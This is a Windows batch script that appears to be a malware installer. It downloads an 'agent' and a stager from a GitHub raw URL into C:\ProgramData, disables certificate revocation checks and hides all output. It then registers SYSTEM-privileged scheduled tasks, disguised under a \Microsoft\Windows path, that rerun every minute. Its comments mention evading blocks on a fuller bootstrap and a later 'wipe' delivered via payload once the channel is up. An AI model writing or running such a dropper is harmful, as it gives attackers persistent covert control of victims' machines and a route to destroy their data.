@echo off
rem WINRTCS_QUICK Q1 - minimal installer for hosts where the full bootstrap gets blocked.
rem No Defender/service/registry-tampering operations: download agent+stager, create tasks, run.
rem Once the agent is alive it self-updates, and the guard handles gryxa. Legacy wipe can follow
rem via payload once the channel is up.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_run.cmd" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_agent.cmd" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%ZD%\winrtcs_agent.cmd" ( echo FAIL agent-download & endlocal & exit /b 1 )
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.cmd" >nul 2>&1 & echo FAIL agent-bad & endlocal & exit /b 2 )
findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_run.cmd" >nul 2>&1 & echo FAIL run-bad & endlocal & exit /b 3 )
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Agent" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Guard" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Run /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
echo WINRTCS_QUICK=OK
endlocal & exit /b 0
